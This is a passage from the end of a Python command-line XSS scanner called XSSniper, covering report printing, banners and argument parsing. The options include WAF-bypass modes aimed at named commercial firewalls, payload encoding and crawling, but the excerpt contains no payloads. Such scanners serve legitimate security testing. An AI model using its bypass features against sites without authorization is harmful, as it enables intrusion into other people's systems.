                print(f"{Fore.WHITE}│ 📍 Parameter: {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}│ 🔧 Method: {Fore.MAGENTA}{vuln['method']}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}│ 🎯 Context: {Fore.GREEN}{vuln['reflection_type']}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}│ 🚀 Payload: {Fore.MAGENTA + Style.BRIGHT}{vuln['payload'][:60]}{'...' if len(vuln['payload']) > 60 else ''}{Style.RESET_ALL}")
                if vuln.get('test_url'):
                    print(f"{Fore.WHITE}│ 🔗 Test URL: {Fore.CYAN}{vuln['test_url'][:60]}{'...' if len(vuln['test_url']) > 60 else ''}{Style.RESET_ALL}")
                if vuln.get('confidence'):
                    print(f"{Fore.WHITE}│ 📊 Confidence: {Fore.GREEN + Style.BRIGHT}{vuln['confidence']}{Style.RESET_ALL}")
                if vuln['cve_related']:
                    print(f"{Fore.WHITE}│ 🏷️  CVEs: {Fore.RED}{', '.join(vuln['cve_related'])}{Style.RESET_ALL}")
                print(f"{Fore.RED}└{'─'*60}{Style.RESET_ALL}")
                print()
        
        # Save report only if user specified output file
        if self.output_file:
            report_data = {
                'scan_info': {
                    'target_url': self.target_url,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'detected_waf': self.detected_waf,
                    'scan_settings': {
                        'threads': self.threads,
                        'delay': self.delay,
                        'browser_verify': self.browser_verify
                    }
                },
                'vulnerabilities': self.vulnerabilities
            }
            
            with open(self.output_file, 'w') as f:
                json.dump(report_data, f, indent=2)
            
            print(f"{Fore.GREEN + Style.BRIGHT}💾 Detailed report saved to: {Fore.CYAN}{self.output_file}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}💡 Tip: Use -o filename.json to save detailed report{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN + Style.BRIGHT}{'═'*80}{Style.RESET_ALL}\n")

def show_banner():
    """Display enhanced banner with beautiful colors and ASCII art"""
    try:
        # Read the ASCII art from banner.txt
        with open('banner.txt', 'r') as f:
            ascii_art = f.read()
        
        banner = f"""
{Fore.CYAN + Style.BRIGHT}{ascii_art}{Style.RESET_ALL}
{Fore.YELLOW + Style.BRIGHT}           ⚡ CVE-Based Detection • Performance Optimized ⚡{Style.RESET_ALL}
{Fore.MAGENTA + Style.BRIGHT}                    Enhanced for 2025 - Open Source{Style.RESET_ALL}
{Fore.GREEN + Style.BRIGHT}                   🎯 Beautiful Output • Payload Visibility 🎯{Style.RESET_ALL}
"""
        print(banner)
    except FileNotFoundError:
        # Fallback banner if banner.txt is not found
        banner = f"""
{Fore.CYAN + Style.BRIGHT}    ╔══════════════════════════════════════════════════════╗
{Fore.CYAN + Style.BRIGHT}    ║           🎯 XSSniper - Advanced XSS Scanner          ║
{Fore.CYAN + Style.BRIGHT}    ║              Professional Security Framework          ║
{Fore.CYAN + Style.BRIGHT}    ║                  Enhanced for 2025                    ║
{Fore.CYAN + Style.BRIGHT}    ╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.MAGENTA + Style.BRIGHT}                        Developed by H4mzaX{Style.RESET_ALL}
{Fore.YELLOW + Style.BRIGHT}           ⚡ CVE-Based Detection • Performance Optimized ⚡{Style.RESET_ALL}
{Fore.GREEN + Style.BRIGHT}                   🎯 Beautiful Output • Payload Visibility 🎯{Style.RESET_ALL}
"""
        print(banner)

async def main():
    show_banner()
    
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner with CVE-based detection')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-l', '--list', help='File containing list of URLs to scan')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads (default: 20)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between requests in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-c', '--crawl', action='store_true', help='Crawl website for additional URLs')
    parser.add_argument('--max-depth', type=int, default=2, help='Maximum crawl depth (default: 2)')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('-o', '--output', help='Output file for results (default: auto-generated)')
    parser.add_argument('--no-browser-verify', action='store_false', dest='browser_verify', help='Disable browser-based verification')
    parser.add_argument('--waf-bypass', action='store_true', help='Enable WAF bypass techniques')
    parser.add_argument('--waf', choices=['cloudflare', 'aws', 'akamai', 'modsecurity', 'imperva', 'f5', 'barracuda', 'fortinet'], help='Force specific WAF bypass mode')
    parser.add_argument('--encoding', help='Encoding methods: url,html,unicode,base64 (comma-separated)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds (default: 15)')
    parser.add_argument('--discover-params', action='store_true', help='Enable parameter discovery')
    parser.add_argument('--all-payloads', action='store_true', help='Use all payload categories')
    parser.add_argument('--report-format', choices=['json', 'html', 'xml'], default='json', help='Output format (default: json)')
    parser.add_argument('--verify-ssl', action='store_true', help='Enable SSL certificate verification (default: disabled)')
    
    args = parser.parse_args()
    
    # Validate input
    if not args.url and not args.list:
        parser.error("Either -u/--url or -l/--list is required")
    
    if args.url and args.list:
        parser.error("Cannot use both -u/--url and -l/--list at the same time")
    
    try:
        if args.list:
            # Scan multiple URLs from file
            try:
                with open(args.list, 'r') as file:
                    urls = [line.strip() for line in file.readlines() if line.strip()]
                
                for url in urls:
                    print(f"Starting scan for: {url}")
                    scanner = AdvancedXSSScanner(
                        target_url=url,
                        threads=args.threads,
                        delay=args.delay,
                        verbose=args.verbose,
                        user_agent=args.user_agent,
                        output_file=args.output,
                        browser_verify=args.browser_verify,
                        verify_ssl=args.verify_ssl,
                        waf_bypass=args.waf_bypass,
                        forced_waf=args.waf,
                        encoding_methods=args.encoding.split(',') if args.encoding else [],
                        discover_params=args.discover_params,
                        all_payloads=args.all_payloads,
                        timeout=args.timeout
                    )
                    
                    await scanner.scan(crawl=args.crawl, max_depth=args.max_depth)
                    
            except FileNotFoundError:
                print(f"{Fore.RED}Error: File '{args.list}' not found!{Fore.RESET}")
        else:
            # Scan single URL
            scanner = AdvancedXSSScanner(
                target_url=args.url,
                threads=args.threads,
                delay=args.delay,
                verbose=args.verbose,
                user_agent=args.user_agent,
                output_file=args.output,
                browser_verify=args.browser_verify,
                verify_ssl=args.verify_ssl,
                waf_bypass=args.waf_bypass,
                forced_waf=args.waf,
                encoding_methods=args.encoding.split(',') if args.encoding else [],
                discover_params=args.discover_params,
                all_payloads=args.all_payloads,
                timeout=args.timeout
            )
            
            await scanner.scan(crawl=args.crawl, max_depth=args.max_depth)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user.")
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

if __name__ == "__main__":
    # Protection check
    if len(sys.argv) == 1:
        show_banner()
        print(f"{Fore.YELLOW}Use --help for usage information")
        sys.exit(0)
    
    # Run async main
    asyncio.run(main())
